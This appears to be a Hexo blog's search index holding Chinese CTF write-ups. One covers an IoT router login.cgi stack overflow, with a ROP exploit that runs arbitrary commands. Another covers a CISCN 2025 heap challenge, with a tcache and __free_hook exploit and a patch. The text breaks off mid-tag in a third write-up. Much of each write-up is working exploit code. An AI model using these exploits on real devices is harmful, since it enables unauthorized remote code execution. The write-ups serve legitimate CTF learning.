<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>西湖论剑IOT-inkon</title>
    <link href="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/"/>
    <url>/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/</url>
    
    <content type="html"><![CDATA[<h3 id="西湖论剑IOT-inkon"><a href="#西湖论剑IOT-inkon" class="headerlink" title="西湖论剑IOT-inkon"></a>西湖论剑IOT-inkon</h3><p>题目给出了完整的镜像内核以及启动脚本</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124200959236.png" alt="image-20250124200959236"></p><p>这里加了一个映射端口用来调试，因为启动的虚拟机是和宿主机共用ip的，这里映射了80端口和2222端口</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201210716.png" alt="image-20250124201210716"></p><p>可以通过scp来传输文件，比如</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">scp -P 2222 ./run.sh ./gdbserver.mipsle  root@127.0.0.1:/root/cpio-root/etc_ro/lighttpd/www/cgi-bin<br></code></pre></td></tr></table></figure><p>题目考点在<code>cpio-root/etc_ro/lighttpd/www/cgi-bin</code>目录下的<code>login.cgi</code>文件里面</p><h4 id="对文件进行逆向分析"><a href="#对文件进行逆向分析" class="headerlink" title="对文件进行逆向分析"></a>对文件进行逆向分析</h4><p>首先有一个跨站请求的检查</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201438771.png" alt="image-20250124201438771"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">check_csrf_referer</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// $s5</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// $s7</span><br><span class="hljs-type">int</span> v2; <span class="hljs-comment">// $v0</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// $s2</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// $s6</span><br><span class="hljs-type">char</span> *v5; <span class="hljs-comment">// $s1</span><br><span class="hljs-type">char</span> *v6; <span class="hljs-comment">// $s4</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// $fp</span><br><span class="hljs-type">int</span> result; <span class="hljs-comment">// $v0</span><br>  FILE *v9; <span class="hljs-comment">// $s0</span><br>  FILE *v10; <span class="hljs-comment">// $s0</span><br><span class="hljs-type">bool</span> v11; <span class="hljs-comment">// dc</span><br><br>  v0 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)nvram_bufget(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYS_DOMAIN1&quot;</span>);<br>  v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)nvram_bufget(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYS_DOMAIN2&quot;</span>);<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)nvram_bufget(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;lan_ipaddr&quot;</span>);<br>  v2 = get_wanif_name();<br>  v4 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)get_ipaddr(v2);<br>  v5 = getenv(<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>);<br>  v6 = getenv(<span class="hljs-string">&quot;HTTP_HOST&quot;</span>);<br>  v7 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)nvram_bufget(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;MeshMode&quot;</span>);<br><span class="hljs-keyword">if</span> ( !access(<span class="hljs-string">&quot;/tmp/web_log&quot;</span>, <span class="hljs-number">0</span>) )<br>  &#123;<br>    v10 = fopen(<span class="hljs-string">&quot;/dev/console&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-keyword">if</span> ( v10 )<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(v10, <span class="hljs-string">&quot;%s:%s:%d:http_host-- %s\n\n&quot;</span>, <span class="hljs-string">&quot;utils.c&quot;</span>, <span class="hljs-string">&quot;check_csrf_referer&quot;</span>, <span class="hljs-number">2101</span>, v6);<br>      fclose(v10);<br>    &#125;<br>  &#125;<br><span class="hljs-keyword">if</span> ( !access(<span class="hljs-string">&quot;/tmp/web_log&quot;</span>, <span class="hljs-number">0</span>) )<br>  &#123;<br>    v9 = fopen(<span class="hljs-string">&quot;/dev/console&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-keyword">if</span> ( v9 )<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<br>        v9,<br><span class="hljs-string">&quot;%s:%s:%d:http_refer-- %s  ipv4_lan== %s ipv4_wan== %s domain1== %s domain2== %s\n\n&quot;</span>,<br><span class="hljs-string">&quot;utils.c&quot;</span>,<br><span class="hljs-string">&quot;check_csrf_referer&quot;</span>,<br><span class="hljs-number">2102</span>,<br>        v5,<br>        v3,<br>        v4,<br>        v0,<br>        v1);<br>      fclose(v9);<br>    &#125;<br>  &#125;<br><span class="hljs-keyword">if</span> ( !v5 )<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(v5, v3) )<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-built_in">strstr</span>(v5, v0) != <span class="hljs-number">0</span>;<br>  result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>  &#123;<br>    v11 = <span class="hljs-built_in">strstr</span>(v5, v1) != <span class="hljs-number">0</span>;<br>    result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>    &#123;<br>      v11 = <span class="hljs-built_in">strstr</span>(v5, v4) != <span class="hljs-number">0</span>;<br>      result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>      &#123;<br>        v11 = <span class="hljs-built_in">strcmp</span>(v7, <span class="hljs-string">&quot;2&quot;</span>) != <span class="hljs-number">0</span>;<br>        result = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>        &#123;<br>          v11 = <span class="hljs-built_in">strstr</span>(v6, v3) != <span class="hljs-number">0</span>;<br>          result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>          &#123;<br>            v11 = <span class="hljs-built_in">strstr</span>(v6, v0) != <span class="hljs-number">0</span>;<br>            result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>            &#123;<br>              v11 = <span class="hljs-built_in">strstr</span>(v6, v1) != <span class="hljs-number">0</span>;<br>              result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( !v11 )<br>              &#123;<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(v6, v4) )<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要保证HTTP_REFERER字段不为空，使得函数返回值为0</p><p>继续检查对发送的POST请求长度做了检查，长度不能大于0x1f3</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201730147.png" alt="image-20250124201730147"></p><p>这里获取发送的报文的属性值<code>page</code></p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201811881.png" alt="image-20250124201811881"></p><p>之后对其匹配，而漏洞正是发生在<code>Goto_chidx</code>函数里面</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201838460.png" alt="image-20250124201838460"></p><p>可以看见再次进行了匹配，获取<code>wlanUrl</code>的值，并通过<code>sprintf</code>函数放到栈中，但是空间只有0x80大小，而v6的值用户可以控制，那么这里就存在未授权，且栈溢出的可能</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124201943762.png" alt="image-20250124201943762"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>本人通过本地调试发现不好绕过前面那个跨站请求的检查，设置环境变量不管用，那么还又一种思路是直接启动环境，然后发送报文</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>libwebutil_base=<span class="hljs-number">0x77e1e000</span><br>libc_base =  <span class="hljs-number">0x77d7c000</span> <br><br>cmd= sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00007970 28 00 BC 8F lw $gp, 0x28($sp)</span><br><span class="hljs-string">.text:00007974 00 00 00 00 nop</span><br><span class="hljs-string">.text:00007978 C8 80 99 8F la $t9, do_system</span><br><span class="hljs-string">.text:0000797C 00 00 0x77d7c000 00 00 nop</span><br><span class="hljs-string">.text:00007980 09 F8 20 03 jalr $t9 ; do_system</span><br><span class="hljs-string">.text:00007984             move    $a0, $s0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>fmt=libwebutil_base+<span class="hljs-number">0x578b8</span>  <span class="hljs-comment">#&quot;%s&quot;</span><br><span class="hljs-comment">#fmt=libwebutil_base+0x578d0</span><br>rop=libwebutil_base+<span class="hljs-number">0x7970</span><br>gp=libwebutil_base+<span class="hljs-number">0x5d550</span> <span class="hljs-comment">#fix $gp</span><br>ret = libc_base + <span class="hljs-number">0x1BD94</span><br><br>cmd=<span class="hljs-string">b&quot;a;&quot;</span>+cmd.encode()+<span class="hljs-string">b&quot;;\x00&quot;</span><br>system = libc_base + <span class="hljs-number">0x47D80</span><br><span class="hljs-comment">#payload=b&quot;page=Goto_chidx&amp;wlanUrl=&quot;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">140</span>-<span class="hljs-number">12</span>)<br> <span class="hljs-comment"># 初始化 payload</span><br><br><span class="hljs-comment"># payload +=b&#x27;b&#x27;*4+ b&#x27;c&#x27;*4 + b&#x27;d&#x27;*4 + p32(ret) + b&#x27;r&#x27;*0xc + p32(system) + p32(gp) + b&#x27;a&#x27;*4 + cmd </span><br><span class="hljs-comment"># payload += b&#x27;r&#x27;*(0x40-8-1) + p32(system)</span><br><span class="hljs-comment"># payload=b&quot;a&quot;*(128)</span><br>payload+=p32(fmt)+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span><br>payload+=p32(rop)+<span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">40</span>+p32(gp)+cmd<br><br>Head = &#123;<span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;wifi.wavlink.com&#x27;</span>&#125;<br>url = <span class="hljs-string">&quot;http://192.168.102.145/cgi-bin/login.cgi&quot;</span><br>Data = &#123;<span class="hljs-string">&quot;page&quot;</span>:<span class="hljs-string">&quot;Goto_chidx&quot;</span>,<span class="hljs-string">&quot;wlanUrl&quot;</span>:payload&#125;<br><br>response = requests.post(url,headers=Head,data=Data)<br><br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><p>原本想通过libc里面gadget来ROP的但是发现官方写的wp并不是利用libc地址，而是通过libwebutil里面的system函数来获取shell的，因为</p><p>调试发现当利用system里面的system函数的时候</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124202524019.png" alt="image-20250124202524019"></p><p>这里gp寄存器会变成一个不可写的地址导致后面会报错（这里不知道为什么正常索引索引不到）</p><p>尝试变成可写地址之后发现会出现gp变成0的情况</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124205603265.png" alt="image-20250124205603265"></p><p>而通过libwebutil也需要伪造gp</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211122626.png" alt="image-20250124211122626"></p><p>合理构造偏移跳转到do_system </p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211348598.png" alt="image-20250124211348598"></p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211413551.png" alt="image-20250124211413551"></p><p>最终效果</p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211441788.png" alt="image-20250124211441788"></p><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211620888.png" alt="image-20250124211620888"></p><h4 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h4><p>对于这种一闪而过的调用还是利用无限跳转法来实现卡住进程</p><p>然后利用如下命令来实现远程连接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./gdbserver 192.168.102.145:1234 --attach PID<br></code></pre></td></tr></table></figure><p><img src="/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/image-20250124211757028.png" alt="image-20250124211757028"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当libc里面的gadget不好构造的时候也可以考虑别的so文件里面的关键函数和gadget</p>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN&amp;CCB半决赛2025_PWN_WP</title>
    <link href="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/"/>
    <url>/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-CCB半决赛-2025-PWN-WP"><a href="#CISCN-CCB半决赛-2025-PWN-WP" class="headerlink" title="CISCN&amp;CCB半决赛_2025_PWN_WP"></a>CISCN&amp;CCB半决赛_2025_PWN_WP</h2><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>记录一下第一次打半决赛国赛，总结来说还是自己太菜了，还有check脚本是真的很shi，正规军白给了。。。</p><h4 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a>break</h5><p><code>edit</code>函数内部，使用了<code>snprintf</code> 来实现，漏洞是因为，size参数和格式化的参数顺序反过来了。导致了堆溢出以及格式化字符串漏洞</p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250319203717539.png" alt="image-20250319203717539"></p><p>后来在栈上发现没有合适的链子使用，但是可以直接通过堆溢出漏洞来进行实现<code>teache bin attack</code></p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250319204603372.png" alt="image-20250319204603372"></p><p>没有<code>show</code>函数来进行泄露地址，但是可以通过<code>teache bin attack</code> 来打<code>IO</code>泄露地址，之后拿到地址之后就可以继续<code>teache bin attack</code> </p><p>来打<code>__free_hook</code>.</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&quot;content: &quot;</span>,size)<br>    io.sendafter(<span class="hljs-string">&quot;want to say: &quot;</span>,msg)<br><br><br><span class="hljs-comment"># add(0,0x20)</span><br><span class="hljs-comment"># add(1,0x28)</span><br><span class="hljs-comment"># add(2,0x28)</span><br><span class="hljs-comment"># add(3,0x28)</span><br><span class="hljs-comment"># add(4,0xf8)</span><br><span class="hljs-comment"># free(1)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6</span>):<br>    add(i,<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x28</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br><br>edit(<span class="hljs-number">16</span>,payload,<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>)<br><br>edit(<span class="hljs-number">16</span>,payload,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># add(11,0x78)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0xd1</span>)<br>edit(<span class="hljs-number">8</span>,payload,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0xc0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br>    free(i)<br>free(<span class="hljs-number">12</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">10</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> <br>edit(<span class="hljs-number">7</span>,payload,<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">7</span>,payload,<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;\x90\x76&#x27;</span><br><span class="hljs-comment"># gdb.attach(io)</span><br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;\xc0&#x27;</span>,payload)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x78</span>)<br>payload =<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x8</span>+ p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x78&#x27;</span>,payload)<br>io.recv(<span class="hljs-number">8</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ec980</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>free(<span class="hljs-number">15</span>)<br>free(<span class="hljs-number">14</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(libc_base+libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]-<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">13</span>,payload,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">13</span>,payload,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;\x28&#x27;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(system))<br><br>free(<span class="hljs-number">17</span>)<br><span class="hljs-comment"># add(0,0x78)</span><br><span class="hljs-comment"># gdb.attach(io)</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h5 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h5><p>将<code>snprintf</code>换成<code>printf</code></p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250319220303146.png" alt="image-20250319220303146"></p><p>或者直接<code>nop</code>掉这个函数</p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250319220428722.png" alt="image-20250319220428722"></p><h4 id="prompt"><a href="#prompt" class="headerlink" title="prompt"></a>prompt</h4><h5 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h5><p>开启了沙箱并且加了一层<code>protobuf</code>的壳</p><p><img src="/2025/03/19/CISCN-CCB%E5%8D%8A%E5%86%B3%E8%B5%9B2025-PWN-WP/image-20250320142453876.png" alt="image-20250320142453876"></p><p>漏洞存在于<code>edit</code>函数</p><p><img 